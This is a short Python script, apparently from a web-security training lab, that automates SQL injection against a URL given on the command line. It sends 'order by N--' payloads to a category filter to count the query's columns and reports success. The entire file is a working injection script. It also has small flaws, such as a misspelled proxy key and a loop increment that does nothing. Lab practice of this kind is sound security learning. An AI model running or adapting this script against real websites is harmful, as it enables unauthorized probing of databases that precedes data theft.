import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"htttp":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
# proxies to work with burp suite
def exploit_sqli(url):
	path = "/filter?category=Accessories"
	for i in range(1,50):
		payload = f"' order by {i}--"
		r = requests.get(url + path + payload, verify=False)
		res = r.text
		if "Internal Server Error" in res:
			return i-1
		i += 1
	return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f"[-] Usage: {sys.argv[0]} <url>")
		print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
		sys.exit(-1)

	print("[+] Getting the number of columns")
	num_col = exploit_sqli(url)
	if num_col:
		print(f"[+] SQL Injection Successful! {num_col} columns")
	else:
		print("[-] SQL Injection Unsuccessful!")
